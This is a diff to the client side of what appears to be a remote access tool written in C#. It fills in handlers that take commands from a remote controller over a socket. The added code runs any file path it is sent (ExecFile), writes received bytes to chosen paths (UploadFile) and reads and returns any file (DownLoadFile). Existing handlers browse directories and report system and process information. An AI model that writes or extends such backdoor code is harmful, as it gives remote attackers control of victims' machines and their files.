@@ -4,6 +4,8 @@ using Shared;
 using System.Text;
 using Newtonsoft.Json;
 using System.Diagnostics;
+using System;
+using System.Threading;
 
 namespace Client
 {
@@ -46,7 +48,6 @@ namespace Client
         {
             StartPoolingConnection();
         }
-
         private static Task CommandExecutor(Socket socket, CancellationToken cancellationToken)
         {
             return Task.Run(async () =>
@@ -58,33 +59,32 @@ namespace Client
                         {
                             byte[] commandBuffer = await ManagementSocketConnection.SocketReaderAsync(socket, cancellationToken);
 
-                            string receivedCommand = Encoding.UTF8.GetString(commandBuffer);
+                            string cmd = Encoding.UTF8.GetString(commandBuffer);
 
-                            string command = Types.SocketCommand(SocketCommands.NotifyMessage);
-
-                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) >= uint.MinValue)
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) > -1)
                             {
-                                string receivedMessage = receivedCommand.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");
+                                string receivedMessage = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");
 
                                 MessageBox.Show(receivedMessage);
                             }
 
-                            if (Types.SocketCommand(SocketCommands.ExecFile).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExecFile)) > -1)
                             {
+                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.ExecFile), "");
 
+                                Process.Start(receivedPath);
                             }
 
-                            if (Types.SocketCommand(SocketCommands.PingTarget).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.PingTarget)) > -1)
                             {
-
+                                throw new ArgumentException("Not Implemented");
                             }
 
-                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) >= uint.MinValue)
-
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) > -1)
                             {
                                 List<ItemType> items = new();
 
-                                string path = receivedCommand.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");
+                                string path = cmd.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");
 
                                 foreach (string item in Directory.GetDirectories(path))
                                 {
@@ -101,9 +101,9 @@ namespace Client
                                 await ManagementSocketConnection.SocketWriterAsync(socket, itemsBuffer, cancellationToken);
                             }
 
-                            if (Types.SocketCommand(SocketCommands.NotifyOSInformations).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyOSInformations)) > -1)
                             {
-                                var systemInfo = new SystemInfo(
+                                SystemInfo systemInfo = new(
                                     Environment.OSVersion.Platform,
                                     Environment.MachineName,
                                     Environment.Is64BitOperatingSystem,
@@ -114,27 +114,39 @@ namespace Client
                                 await ManagementSocketConnection.SocketWriterAsync(socket, osInfoBuffer, cancellationToken);
                             }
 
-                            if (Types.SocketCommand(SocketCommands.NotifyShellCommand).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyShellCommand)) > -1)
                             {
-
+                                throw new ArgumentException("Not Implemented");
                             }
 
-                            if (Types.SocketCommand(SocketCommands.RemoteShutdown).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.RemoteShutdown)) > -1)
                             {
-
+                                throw new ArgumentException("Not Implemented");
                             }
 
-                            if (Types.SocketCommand(SocketCommands.UploadFile).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.UploadFile)) > -1)
                             {
+                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.UploadFile), "");
 
+                                using FileStream fileStream = new(receivedPath, FileMode.Append, FileAccess.Write);
+
+                                byte[] buffer = await ManagementSocketConnection.SocketReaderAsync(socket, cancellationToken);
+
+                                await fileStream.WriteAsync(buffer);
+
+                                fileStream.Close();
                             }
 
-                            if (Types.SocketCommand(SocketCommands.DownLoadFile).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.DownLoadFile)) > -1)
                             {
+                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.DownLoadFile), "");
 
+                                byte[] buffer = File.ReadAllBytes(receivedPath);
+
+                                await ManagementSocketConnection.SocketWriterAsync(socket, buffer, cancellationToken);
                             }
 
-                            if (Types.SocketCommand(SocketCommands.GetProcesses).Equals(receivedCommand))
+                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.GetProcesses)) > -1)
                             {
                                 List<ProcessInfo> processes = new();
 
